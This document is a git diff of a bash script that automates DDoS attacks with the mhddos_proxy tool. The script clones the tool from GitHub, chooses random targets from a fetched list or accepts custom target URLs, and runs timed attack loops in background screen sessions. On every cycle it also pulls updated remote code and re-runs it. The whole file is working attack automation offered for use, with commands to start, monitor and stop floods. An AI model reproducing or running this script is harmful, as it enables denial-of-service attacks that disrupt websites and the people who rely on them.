@@ -12,8 +12,8 @@ my_path=$(readlink -f "$0")
 
 auto_repo='https://github.com/girador/auto.git'
 auto_dir=$my_dir/auto
-mhddos_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
-mhddos_dir=$my_dir/mhddos
+tool_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
+tool_dir=$my_dir/tool
 
 my_ulimit=1048576
 attack_timeout=20m
@@ -35,39 +35,34 @@ self_help() {
 mhddos_proxy attacks automation
 With intervals, timeouts, random targets, target autoupdate and ability to run custom mhddos_proxy attack
 '"$my_name"' ACTION:
-	-h | --help | h | help
+	help | -h | --help
 		show this help meesage
-	i | install | u | update
+	install
 		installs/reinstalls/updates '"$my_name"' and its dependencies
 		'"$my_name"' becomes available as command in shell
-	r | run OPTIONS...
-		Run attack with random target in foreground, OPTIONS after r | run will be passed to mhddos_proxy as is
-		Full list of mhddos_proxy options: https://github.com/porthole-ascend-cinnamon/mhddos_proxy#cli
+	run OPTIONS...
+		Run attack in foreground, with random targets or with custom targets
+		OPTIONS will be passed to mhddos_proxy as is: https://github.com/porthole-ascend-cinnamon/mhddos_proxy#cli
 		Examples:
 			Run attack on random targets with default OPTIONS:
 				'"$my_name"' run
 			Run attack on random targets with custom OPTIONS passed to mhddos_proxy:
 				'"$my_name"' run --threads 2000 --rpc 1000 --debug
-		You can also run your custom targets, for instance:
-			'"$my_name"' run mhddos https://YOURTARGETS... OPTIONS...
-	sta | start OPTIONS...
-		The same as r | run, but starts the attack in screen session as a service/daemon
+			Run your custom targets:
+				'"$my_name"' run custom https://YOURTARGETS... OPTIONS...
+	start OPTIONS...
+		The same as run, but starts the attack in screen session as a service/daemon
 		The name of screen session will be: PID.'"$my_name"'.DATE_TIME_COMMAND
-		Recommended parameters to start with:
-			'"$my_name"' start --threads 2000 --rpc 1000 --debug
-		Custom targets, for instance from dedicated channels
-		CUSTOMTARGETSANDOPTIONS would be everything after "python3 runner.py":
-			'"$my_name"' start mhddos CUSTOMTARGETSANDOPTIONS...
-	s | show ATTACK
-		Show ATTACK progress, basically shows the attack log in real time
-		A part of attack name can be provided
-			So to view attack 9936.auto_mhddos.22-04-06_11:55:35_threads_2000_rpc_1000_debug,
-			you can just type: '"$my_name"' show 9936
-		If no ATTACK provided, shows the list of running attacks initiated by '"$my_name"'
-	sto | stop ATTACK
-		Stops ATTACK
+	status ATTACK
+		Show load and ATTACK status:
+		- process tree
+		- last 20 records from ATTACK log
+		If no ATTACK provided, shows the status of all running attacks initiated by '"$my_name"'
+		Partial ATTACK name is accepted, e.g. "11:55" instead of 9936.auto_mhddos.22-04-06_11:55:35_threads_2000_rpc_1000_debug
+	stop ATTACK
+		Stops ATTACK, partial name is also accepted
 		If no ATTACK provided, stops all found running attacks initiated by '"$my_name"'
-	rm | remove
+	remove
 		Removes '"$my_name"' components, found running attacks and logs
 	'
 	return
@@ -79,25 +74,25 @@ main() {
 	arg="$1"
 	shift || true
 	case "$arg" in
-	-h | --help | h | help)
+	help | -h | --help)
 		self_help
 		;;
-	i | install | u | update)
+	install)
 		self_install "$@"
 		;;
-	r | run)
+	run)
 		self_run "$@"
 		;;
-	sta | start)
+	start)
 		self_start "$@"
 		;;
-	s | show | '')
-		self_show "$@"
+	status | '')
+		self_status "$@"
 		;;
-	sto | stop)
+	stop)
 		self_stop "$@"
 		;;
-	rm | remove)
+	remove)
 		self_remove "$@"
 		;;
 	*)
@@ -127,17 +122,16 @@ self_install() {
 	if [ -f "$auto_dir"/"$my_name" ]; then
 		ln -sf "$auto_dir"/"$my_name" "$my_exe"
 	else
-		install -m 0700 "$my_path" "$my_exe"
+		install -m 0700 "$my_path" "$my_exe" || true
 	fi
 
-	rm -rfv "$mhddos_dir"
-	git clone --depth 1 "$mhddos_repo" "$mhddos_dir"
-	pip3 install -r "$mhddos_dir"/requirements.txt
+	rm -rfv "$tool_dir"
+	git clone --depth 1 "$tool_repo" "$tool_dir"
+	pip3 install -r "$tool_dir"/requirements.txt
 
 	apt autoremove -y
 
 	print_green "$my_name installed"
-	self_help
 
 }
 
@@ -145,26 +139,33 @@ self_run() {
 
 	ulimit -n "$my_ulimit"
 
+	if [ "$1" == custom ]; then
+		shift
+		target_mode=custom
+	fi
+
 	while true; do
 
 		print_blue "Updating the repos..."
-		mhddos_pull=$(git -C "$mhddos_dir" pull origin main)
-		grep -q "Already.*up.*to.*date" <<<"$mhddos_pull" || {
-			print_blue "mhddos repo updated, updating the requirements..."
-			pip3 install -r "$mhddos_dir"/requirements.txt
-			print_green "mhddos requirements updated"
+		tool_pull=$(git -C "$tool_dir" pull origin main)
+		grep -q "Already.*up.*to.*date" <<<"$tool_pull" || {
+			print_blue "Tool repo updated, updating the requirements..."
+			pip3 install -r "$tool_dir"/requirements.txt
+			print_green "Tool requirements updated"
 		}
 		auto_pull=$(git -C "$auto_dir" pull origin main)
 		grep -q "Already.*up.*to.*date" <<<"$auto_pull" || {
 			print_blue "$my_name repo updated, restarting the task with the new version of script..."
-			"$my_path" run "$@"
+			"$my_path" install
+			target_mode="$target_mode" "$my_path" run "$@"
 			return
 		}
 
-		if [ "$1" == "mhddos" ]; then
-			shift
-			print_blue "mhddos_proxy with custom targets and options: $@"
-			python3 "$mhddos_dir"/runner.py "$@" &
+		cd "$tool_dir"
+
+		if [ "$target_mode" = custom ]; then
+			print_blue "Custom target: $*"
+			python3 "$tool_dir"/runner.py "$@" &
 			attack_pid=$!
 		else
 			print_blue "Parsing targets from $targets"
@@ -177,9 +178,10 @@ self_run() {
 			target_cmd=$(sed "$target_random"'q;d' <<<"$target_list")
 			print_blue "Random target: $target_random: $target_cmd"
 
-			python3 "$mhddos_dir"/runner.py $target_cmd "$@" &
+			python3 "$tool_dir"/runner.py $target_cmd "$@" &
 			attack_pid=$!
 		fi
+
 		print_green "Running attack for $attack_timeout: PID $attack_pid"
 		sleep "$attack_timeout"
 		print_blue "$attack_timeout of attack elapsed"
@@ -206,55 +208,58 @@ self_start() {
 	daily
 	missingok
 	notifempty
-	delaycompress
 	compress
 }' >/etc/logrotate.d/"$my_name"
 	attack_log="$my_log"/"$attack_name".log
 	print_blue "Starting attack $attack_name"
 	screen -dmS "$my_name"."$attack_name" -L -Logfile "$attack_log" "$my_path" run "$@"
 	print_green "Attack $attack_name started"
-	print_blue "watch: $my_name show $attack_name"
-	print_blue "stop:  $my_name stop $attack_name"
 
 }
 
-self_show() {
+attack_init() {
 
-	if attack_list=$(screen -ls | awk '{print $1}' | grep "\.${my_name}\."); then
-		if [ $# = 0 ]; then
-			echo "$attack_list"
-		else
-			if attack_name=$(self_show | grep -m1 "$1"); then
-				attack_log="$my_log"/"$(cut -d. -f3 <<<"$attack_name")".log
-				print_blue "Showing attack $attack_name from $attack_log, ctrl+c to to stop watching"
-				tail -f "$attack_log"
-			else
-				print_red "Attack '$1' not found" >&2
-				return 1
-			fi
-		fi
-	else
+	attack_list=$(screen -ls | awk '{print $1}' | grep "\.${my_name}\.") || {
 		print_red "No attacks running" >&2
 		return 1
+	}
+	for attack_init; do
+		attack_name=$(grep -m1 "$1" <<<"$attack_list") || {
+			print_red "No such attack: $attack_init" >&2
+			return 1
+		}
+	done
+
+}
+
+self_status() {
+
+	print_blue "Load: $(cat /proc/loadavg)"
+	if [ $# = 0 ]; then
+		attack_init
+		set -- $attack_list
 	fi
+	for self_status; do
+		attack_init "$self_status"
+		print_blue "Status of attack $attack_name"
+		pstree -al "$(cut -d. -f1 <<<"$attack_name")"
+		tail -20 "$my_log"/"$(cut -d. -f3 <<<"$attack_name")".log | sed 's/^/\t/'
+		echo -e "\e[0m"
+	done
 
 }
 
 self_stop() {
 
 	if [ $# = 0 ]; then
-		set -- $(self_show)
+		attack_init
+		set -- $attack_list
 	fi
-	for attack; do
-		if attack_name=$(self_show | grep -m1 "$attack"); then
-			print_blue "Stopping attack $attack_name"
-			attack_pid=$(cut -d. -f1 <<<"$attack_name")
-			kill -- -"$attack_pid"
-			print_green "Attack with PID $attack_pid stopped"
-		else
-			print_red "Attack $attack not found" >&2
-			return 1
-		fi
+	for self_stop; do
+		attack_init "$self_stop"
+		print_blue "Stopping attack $attack_name"
+		kill -- -"$(cut -d. -f1 <<<"$attack_name")"
+		print_green "Attack $attack_name stopped"
 	done
 
 }
